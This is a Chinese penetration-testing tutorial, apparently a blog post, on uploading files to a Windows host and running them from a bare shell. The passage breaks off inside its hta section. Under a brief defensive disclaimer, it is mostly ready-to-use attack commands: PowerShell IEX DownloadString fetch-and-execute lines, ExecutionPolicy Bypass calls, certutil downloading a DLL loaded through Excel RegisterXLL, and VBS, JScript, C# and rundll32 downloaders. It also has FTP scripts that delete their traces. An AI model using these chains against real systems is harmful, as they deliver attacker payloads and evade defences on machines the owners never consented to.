{"title":"Win下终端实现文件上传和下载执行","slug":"网安大类/PenetrationNote/Windows渗透利用/Win下终端实现文件上传和下载执行","date":"2019-08-17T05:36:30.000Z","updated":"2023-01-31T02:29:10.674Z","url":"2019/8-17-395.html","path":"api/articles/2019/8-17-395.html.json","covers":["https://img.weiyigeek.top/2019/1/20190917170548.png","https://img.weiyigeek.top/2019/1/20190917171035.png","https://img.weiyigeek.top/2019/1/20190917154953.png","https://img.weiyigeek.top/2019/1/20190917143040.png","https://img.weiyigeek.top/2019/1/20190917144418.png","https://img.weiyigeek.top/2019/1/20190917144448.png","https://img.weiyigeek.top/2019/1/20190917145014.png","https://img.weiyigeek.top/2019/1/20190917145026.png","https://img.weiyigeek.top/2019/1/20190917160633.png","https://img.weiyigeek.top/2019/1/20190917150827.png","https://img.weiyigeek.top/2019/1/20190917150846.png","https://img.weiyigeek.top/2019/1/20190917150857.png","https://img.weiyigeek.top/2019/1/20190917150953.png","https://img.weiyigeek.top/2019/1/20190917150815.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h4><p>描述:作为一个网络安全从业者,您可能会常常在渗透测试中遇到只有一个Shell情况下如何将可执行文件上传到一台windows机器上(主要由于没有界面操作),我在实际渗透测试中将我的经验和方法进行分享;</p>\n<p><br></p>\n<h4 id=\"0x01-方式\"><a href=\"#0x01-方式\" class=\"headerlink\" title=\"0x01 方式\"></a>0x01 方式</h4><h5 id=\"1-debug\"><a href=\"#1-debug\" class=\"headerlink\" title=\"(1) debug\"></a>(1) debug</h5><p>描述:debug是一个程序调试工具功能包括：<code>直接输入，更改，跟踪，运行汇编语言源程序</code>，观察操作系统的内容看ROM BIOS的内容，观察更改RAM内部的设置值，以扇区或文件的方式读写软盘数据;</p>\n<p>debug使用思路：<code>把需要上传的exe转换成十六进制hex的形式，通过echo命令将hex代码写入文件，使用debug功能将hex代码还原出exe文件</code>。<br>Debug它还有一个功能可以<code>将十六进制代码转换为可执行文件</code>：</p>\n<p>实际测试利用kali中的exe2hex.exe<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exe2hex -x demo.exe </span><br><span class=\"line\">[*] exe2hex v1.5.1</span><br><span class=\"line\">[i] Outputting to /root/demo.bat (BATch) and /root/demo.cmd (PoSh)</span><br><span class=\"line\">[+] Successfully wrote (BATch) /root/demo.bat <span class=\"comment\">#cmd执行</span></span><br><span class=\"line\">[+] Successfully wrote (PoSh) /root/demo.cmd <span class=\"comment\">#powershell执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$debug</span> &gt; 内容复制粘贴到cmd命令行下依次执行</span><br><span class=\"line\">-r </span><br><span class=\"line\">-q 退出</span><br><span class=\"line\">或者直接执行bat即可</span><br><span class=\"line\">./demo.bat</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#关键语句</span></span><br><span class=\"line\">debug /?</span><br><span class=\"line\"><span class=\"comment\">#判断debug是否存在</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> NOT %ERRORLEVEL% == 0 <span class=\"built_in\">echo</span> &amp;<span class=\"built_in\">echo</span> &amp;<span class=\"built_in\">echo</span> &amp;<span class=\"built_in\">echo</span> **** **** **** **** ****&amp;<span class=\"built_in\">echo</span> *** Missing DEBUG.exe ***&amp;<span class=\"built_in\">echo</span> **** **** **** **** ****&amp;<span class=\"built_in\">exit</span> /b</span><br><span class=\"line\"><span class=\"built_in\">echo</span> n demo.0&gt;demo.hex</span><br><span class=\"line\"><span class=\"built_in\">echo</span> e 0100&gt;&gt;demo.hex</span><br><span class=\"line\"><span class=\"built_in\">echo</span> 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 0e 1f ba 0e 00 b4 09 <span class=\"built_in\">cd</span> 21 b8 01 4c <span class=\"built_in\">cd</span> 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00&gt;&gt;demo.hex</span><br><span class=\"line\">debug&lt;demo.hex</span><br><span class=\"line\">move /Y demo.0 demo.exe</span><br><span class=\"line\"><span class=\"built_in\">echo</span>. &gt;demo.hex</span><br><span class=\"line\">del /F /Q demo.hex demo.0</span><br><span class=\"line\">dir demo.exe</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917170548.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>补充说明：</p>\n<ul>\n<li>生成的demo.cmd可以采用Powershell来进行hex转成为exe可执行文件<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917171035.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n</ul>\n<p><em>注意事项：</em></p>\n<ul>\n<li>Debug在Win7以上不自带了需要去官网下载<a href=\"https://www.dosbox.com/\" target=\"_blank\" rel=\"noopener\">DOSBox程序</a>与debug.exe程序;</li>\n</ul>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917154953.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<h5 id=\"2-FTP\"><a href=\"#2-FTP\" class=\"headerlink\" title=\"(2) FTP\"></a>(2) FTP</h5><p>描述:搭建好ftp服务器利用文本记录FTP命令进行下载常用参数<code>#-A 匿名登录 PUT上传文件 GET下载文件 BIN 在上传和下载文件使用</code><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> open 192.168.1.1 21&gt; ftp.txt</span><br><span class=\"line\"><span class=\"built_in\">echo</span> ftp &gt;&gt; ftp.txt</span><br><span class=\"line\"><span class=\"built_in\">echo</span> bin &gt;&gt; ftp.txt</span><br><span class=\"line\"><span class=\"built_in\">echo</span> ftp &gt;&gt; ftp.txt</span><br><span class=\"line\"><span class=\"built_in\">echo</span> GET text.exe &gt;&gt; ftp.txt</span><br><span class=\"line\"><span class=\"built_in\">echo</span> del test.exe &gt;&gt; ftp.txt  <span class=\"comment\">#毁尸灭迹</span></span><br><span class=\"line\">ftp -A -s:ftp.txt</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917143040.png\" alt=\"WeiyiGeek.FTP\" title=\"\" class=\"\">\n                <p>WeiyiGeek.FTP</p>\n            </figure></p>\n<p>以匿名用户为例，我们去配置文件vsftpd.conf 里面如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Vsftpd:Example config file /etc/vsftpd.conf</span></span><br><span class=\"line\">anon_upload_enable=YES</span><br><span class=\"line\">anon_mkdir_write_enable=YES</span><br><span class=\"line\">local_root=/var/www/html</span><br><span class=\"line\">chroot_local_user=YES</span><br><span class=\"line\">anon_root=/var/www/html</span><br></pre></td></tr></table></figure><br>注：初次使用ftp下载防火墙会弹框拦截，使用前记得要先添加防火墙规则</p>\n<p><br></p>\n<h5 id=\"3-VBS-WScript-exe\"><a href=\"#3-VBS-WScript-exe\" class=\"headerlink\" title=\"(3) VBS-WScript.exe\"></a>(3) VBS-WScript.exe</h5><p>描述：您永远都不知道VBS强大,话说MYSQL作者写的第一行代码就是采用VBS写的;<br>downloader使用<code>msxml2.xmlhttp</code>和<code>adodb.stream</code>对象统统联合<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#按顺序依次执行后会生成download.vbs，然后执行download.vbs即可实现下载ssss2.exe</span></span><br><span class=\"line\">Set Post = CreateObject(<span class=\"string\">\"Msxml2.XMLHTTP\"</span>)</span><br><span class=\"line\">Set Shell = CreateObject(<span class=\"string\">\"Wscript.Shell\"</span>)</span><br><span class=\"line\">Post.Open <span class=\"string\">\"GET\"</span>,<span class=\"string\">\"http://10.10.10.101/text.txt\"</span>,0  <span class=\"comment\">#请求出文档内容</span></span><br><span class=\"line\">Post.Send()</span><br><span class=\"line\">​</span><br><span class=\"line\">Set aGet = CreateObject(<span class=\"string\">\"ADODB.Stream\"</span>)</span><br><span class=\"line\">aGet.Mode = 3</span><br><span class=\"line\">aGet.Type = 1   <span class=\"comment\">#binary</span></span><br><span class=\"line\">aGet.Open()</span><br><span class=\"line\">aGet.Write(Post.responseBody)   <span class=\"comment\">#将文档内容写到文件之中</span></span><br><span class=\"line\">aGet.SaveToFile <span class=\"string\">\"C:\\text.txt\"</span>,2</span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------#</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> Set Post = CreateObject(<span class=\"string\">\"Msxml2.XMLHTTP\"</span>) &gt;&gt;download.vbs</span><br><span class=\"line\"><span class=\"built_in\">echo</span> Set Shell = CreateObject(<span class=\"string\">\"Wscript.Shell\"</span>) &gt;&gt;download.vbs</span><br><span class=\"line\"><span class=\"built_in\">echo</span> Post.Open <span class=\"string\">\"GET\"</span>,<span class=\"string\">\"http://192.168.174.145/ssss2.exe\"</span>,0 &gt;&gt;download.vbs</span><br><span class=\"line\"><span class=\"built_in\">echo</span> Post.Send() &gt;&gt;download.vbs</span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"built_in\">echo</span> Set aGet = CreateObject(<span class=\"string\">\"ADODB.Stream\"</span>) &gt;&gt;download.vbs</span><br><span class=\"line\"><span class=\"built_in\">echo</span> aGet.Mode = 3 &gt;&gt;download.vbs</span><br><span class=\"line\"><span class=\"built_in\">echo</span> aGet.Type = 1 &gt;&gt;download.vbs</span><br><span class=\"line\"><span class=\"built_in\">echo</span> aGet.Open() &gt;&gt;download.vbs</span><br><span class=\"line\"><span class=\"built_in\">echo</span> aGet.Write(Post.responseBody) &gt;&gt;download.vbs</span><br><span class=\"line\"><span class=\"built_in\">echo</span> aGet.SaveToFile <span class=\"string\">\"C:\\test\\update\\ssss2.exe\"</span>,2 &gt;&gt;download.vbs</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<p>补充VBS下载脚本:</p>\n<blockquote>\n<p>使用 Usage 帮助:cscript //nologo C:\\inetpub\\wwwroot\\wget.vbs 远程地址 保存文件名</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#vbs脚本开始</span></span><br><span class=\"line\">Set oHttp = CreateObject(<span class=\"string\">\"MMC20.Application\"</span>)</span><br><span class=\"line\">a=oHttp.Document.ActiveView.ExecuteShellCommand(<span class=\"string\">\"calc.exe\"</span>,<span class=\"string\">\"d:\\\",\"</span><span class=\"string\">\",\"</span>Minimized<span class=\"string\">\")</span></span><br><span class=\"line\"><span class=\"string\">'View.ExecuteShellCommand( _</span></span><br><span class=\"line\"><span class=\"string\">  'ByVal Command As String, _</span></span><br><span class=\"line\"><span class=\"string\">  'ByVal Directory As String, _</span></span><br><span class=\"line\"><span class=\"string\">  'ByVal Parameters As String, _</span></span><br><span class=\"line\"><span class=\"string\">  'ByVal WindowState As String _</span></span><br><span class=\"line\"><span class=\"string\">')</span></span><br><span class=\"line\"><span class=\"string\">​</span></span><br><span class=\"line\"><span class=\"string\">echo iRemote=LCase(Wscript.Arguments(0)) &gt;&gt;C:\\\\wget.vbs</span></span><br><span class=\"line\"><span class=\"string\">echo iLocal=LCase(Wscript.Arguments(1)) &gt;&gt;C:\\\\wget.vbs</span></span><br><span class=\"line\"><span class=\"string\">echo wscript.echo \"</span>[!]GET <span class=\"string\">\",iRemote &gt;&gt;C:\\\\wget.vbs</span></span><br><span class=\"line\"><span class=\"string\">​</span></span><br><span class=\"line\"><span class=\"string\">echo set xPost=CreateObject(\"</span>Microsoft.XMLHTTP<span class=\"string\">\") &gt;&gt;C:\\\\wget.vbs</span></span><br><span class=\"line\"><span class=\"string\">echo xPost.Open \"</span>GET<span class=\"string\">\",iRemote,0 &gt;&gt;C:\\\\wget.vbs</span></span><br><span class=\"line\"><span class=\"string\">echo xPost.Send() &gt;&gt;C:\\\\wget.vbs</span></span><br><span class=\"line\"><span class=\"string\">​</span></span><br><span class=\"line\"><span class=\"string\">echo set sGet=CreateObject(\"</span>ADODB.Stream<span class=\"string\">\") &gt;&gt;C:\\\\wget.vbs</span></span><br><span class=\"line\"><span class=\"string\">echo sGet.Mode=3 &gt;&gt;C:\\\\wget.vbs</span></span><br><span class=\"line\"><span class=\"string\">echo sGet.Type=1 &gt;&gt;C:\\\\wget.vbs</span></span><br><span class=\"line\"><span class=\"string\">echo sGet.Open() &gt;&gt;C:\\\\wget.vbs</span></span><br><span class=\"line\"><span class=\"string\">echo sGet.Write xPost.ResponseBody &gt;&gt;C:\\\\wget.vbs</span></span><br><span class=\"line\"><span class=\"string\">echo sGet.SaveToFile iLocal,2 &gt;&gt;C:\\\\wget.vbs</span></span><br></pre></td></tr></table></figure>\n<p><br></p>\n<h5 id=\"4-Powershell-exe\"><a href=\"#4-Powershell-exe\" class=\"headerlink\" title=\"(4) Powershell.exe\"></a>(4) Powershell.exe</h5><p>描述:这个也是windows下渗透必备利器;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell(new-object System.Net.WebClient).DownloadFile(<span class=\"string\">'http://127.0.0.1/test.js'</span>,<span class=\"string\">'D:\\text.txt'</span>)</span><br><span class=\"line\"><span class=\"comment\">#下面都是直接执行;(后面可以加参数)</span></span><br><span class=\"line\">powershell <span class=\"string\">\"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/test.js')\"</span></span><br><span class=\"line\">powershell IEX (New-Object Net.WebClient).DownloadString(<span class=\"string\">'http://127.0.0.1/1.bat'</span>)</span><br></pre></td></tr></table></figure></p>\n<p>使用 powershell 脚本上传 psexec.exe 到目标机器<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#方式1</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$client</span> = New-Object System.Net.WebClient &gt; script.ps1</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$targetlocation</span> = <span class=\"string\">\"http://192.168.56.102/PsExec.exe\"</span> &gt;&gt; script.ps1</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$client</span>.DownloadFile(<span class=\"variable\">$targetlocation</span>,<span class=\"string\">\"psexec.exe\"</span>) &gt;&gt; script.ps1</span><br><span class=\"line\">​</span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"comment\">#方式2:在powershell中表示目录wget.ps1 </span></span><br><span class=\"line\"><span class=\"variable\">$storageDir</span>=<span class=\"variable\">$pwd</span>  </span><br><span class=\"line\"><span class=\"variable\">$webclient</span>=New-Object System.Net.WebClient </span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"string\">\"http://10.11.0.79/payload/mp_64.exe\"</span> </span><br><span class=\"line\"><span class=\"variable\">$file</span>=<span class=\"string\">\"mp_64.exe\"</span> </span><br><span class=\"line\"><span class=\"variable\">$webclient</span>.DownloadFile(<span class=\"variable\">$url</span>,<span class=\"variable\">$file</span>) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#绕过脚本执行的几种方式:</span></span><br><span class=\"line\">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1</span><br><span class=\"line\">PowerShell.exe -ExecutionPolicy Bypass -File .\\runme.ps1</span><br><span class=\"line\">powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</span><br></pre></td></tr></table></figure></p>\n<p>powershell中的利用测试系统安装Office软件，下载执行dll对应的powershell代码如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$path</span>=<span class=\"string\">\"D:\\test\\msg1.dll\"</span></span><br><span class=\"line\">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/<span class=\"built_in\">test</span>/master/msg.dll  <span class=\"variable\">$path</span></span><br><span class=\"line\"><span class=\"variable\">$excel</span> = [activator]::CreateInstance([<span class=\"built_in\">type</span>]::GetTypeFromProgID(<span class=\"string\">\"Excel.Application\"</span>))</span><br><span class=\"line\"><span class=\"variable\">$excel</span>.RegisterXLL(<span class=\"variable\">$path</span>)</span><br></pre></td></tr></table></figure></p>\n<p>方式3：将hex转换成为exe可执行文件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\WeiyiGeek\\Desktop&gt;<span class=\"built_in\">echo</span> | <span class=\"built_in\">set</span> /p=<span class=\"string\">\"5f636f6f6b696500\"</span> 1&gt;&gt;demo.hex</span><br><span class=\"line\">C:\\Users\\WeiyiGeek\\Desktop&gt;powershell -Command <span class=\"string\">\"<span class=\"variable\">$h</span>=Get-Content -readcount 0 -path './demo.hex';<span class=\"variable\">$l</span>=<span class=\"variable\">$h</span>[0].length;<span class=\"variable\">$b</span>=New-Object byte[] (<span class=\"variable\">$l</span>/2);<span class=\"variable\">$x</span>=0;for (<span class=\"variable\">$i</span>=0;<span class=\"variable\">$i</span> -le <span class=\"variable\">$l</span>-1;<span class=\"variable\">$i</span>+=2)&#123;<span class=\"variable\">$b</span>[<span class=\"variable\">$x</span>]=[byte]::Parse(<span class=\"variable\">$h</span>[0].Substring(<span class=\"variable\">$i</span>,2),[System.Globalization.NumberStyles]::HexNumber);<span class=\"variable\">$x</span>+=1&#125;;set-content -encoding byte 'demo.exe' -value <span class=\"variable\">$b</span>;Remove-Item -force demo.hex;\"</span></span><br></pre></td></tr></table></figure><br><br></p>\n<h5 id=\"5-csc-exe\"><a href=\"#5-csc-exe\" class=\"headerlink\" title=\"(5) csc.exe\"></a>(5) csc.exe</h5><p>微软.NET Framework 中的C#编译器，Windows系统中默认包含，可在命令行下将cs文件编译成exe<br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//c# downloader的代码为：</span></span><br><span class=\"line\">C:\\Windows\\Microsoft.NET\\Framework\\v4<span class=\"number\">.0</span><span class=\"number\">.50727</span>\\csc.exe /out:C:\\download.exe C:\\download.cs</span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"comment\">//C:\\download.cs 代码：</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Net;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> downloader</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span><span class=\"params\">(<span class=\"built_in\">string</span>[] args)</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            WebClient client = <span class=\"keyword\">new</span> WebClient();</span><br><span class=\"line\">            <span class=\"built_in\">string</span> URLAddress = @<span class=\"string\">\"http://192.168.174.145/ssss2.exe\"</span>;</span><br><span class=\"line\">            <span class=\"built_in\">string</span> receivePath = @<span class=\"string\">\"C:\\test\\update\\\";</span></span><br><span class=\"line\"><span class=\"string\">            client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName</span></span><br><span class=\"line\"><span class=\"string\">        (URLAddress));</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">｝</span></span><br></pre></td></tr></table></figure><br>注：csc.exe的绝对路径要根据系统的.net版本来确定</p>\n<p><br></p>\n<h5 id=\"6-JScript\"><a href=\"#6-JScript\" class=\"headerlink\" title=\"(6) JScript\"></a>(6) JScript</h5><p>描述:相比于JSRat中用的Scripting.FileSystemObject换用ADODB.Stream实现起来更加简单高效</p>\n<p>以下代码依次保存为js文件，直接执行即可实现下载文件<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"built_in\">Object</span> = WScript.CreateObject(<span class=\"string\">\"MSXML2.XMLHTTP\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.open(<span class=\"string\">\"GET\"</span>,<span class=\"string\">\"http://127.0.0.1/1.bat\"</span>,<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.send();</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">Object</span>.Status == <span class=\"number\">200</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> Stream = WScript.CreateObject(<span class=\"string\">\"ADODB.Stream\"</span>);</span><br><span class=\"line\">    Stream.Open();</span><br><span class=\"line\">    Stream.Type = <span class=\"number\">1</span>;</span><br><span class=\"line\">    Stream.Write(<span class=\"built_in\">Object</span>.ResponseBody);</span><br><span class=\"line\">    Stream.SaveToFile(<span class=\"string\">\"C:\\\\1.bat\"</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">    Stream.Close();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917144418.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<h5 id=\"7-rundll32-exe\"><a href=\"#7-rundll32-exe\" class=\"headerlink\" title=\"(7) rundll32.exe\"></a>(7) rundll32.exe</h5><p>描述:有时路径要加 \\ 防止转义,合并成rundll32的一句话（类似于JSRat的启动方式）：<br><figure class=\"highlight bat\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();Object=new<span class=\"variable\">%20ActiveXObject(\"Microsoft.XMLHTTP\");Object.open(\"GET\",\"http://192.168.174.145/ssss2.exe\",false);Object.send();if(Object.Status==200)&#123;Stream=new%</span><span class=\"number\">20</span>ActiveXObject(\"ADODB.Stream\");Stream.Open();Stream.<span class=\"built_in\">Type</span>=<span class=\"number\">1</span>;Stream.Write(Object.ResponseBody);Stream.SaveToFile(\"C:\\\\test\\\\update\\\\ssss2.exe\",<span class=\"number\">2</span>);Stream.Close();&#125;</span><br></pre></td></tr></table></figure></p>\n<p>执行命令进行打开我们上传的软件：<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917144448.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>IE就是要允许Active脚本活动，其他默认不支持Active自己需要更改配置.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">a&#x3D;new ActiveXObject(&quot;WScript.Shell&quot;);</span><br><span class=\"line\">a.run(&#39;%windir%\\\\System32\\\\cmd.exe &#x2F;c calc.exe&#39;, 0);</span><br><span class=\"line\">window.close();</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h5 id=\"8-hta\"><a href=\"#8-hta\" class=\"headerlink\" title=\"(8) hta\"></a>(8) hta</h5><p>描述:添加最小化和自动退出hta程序的功能，执行过程中会最小化hta窗口，下载文件结束后自动退出hta程序<br>以下代码保存为.hta文件：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span 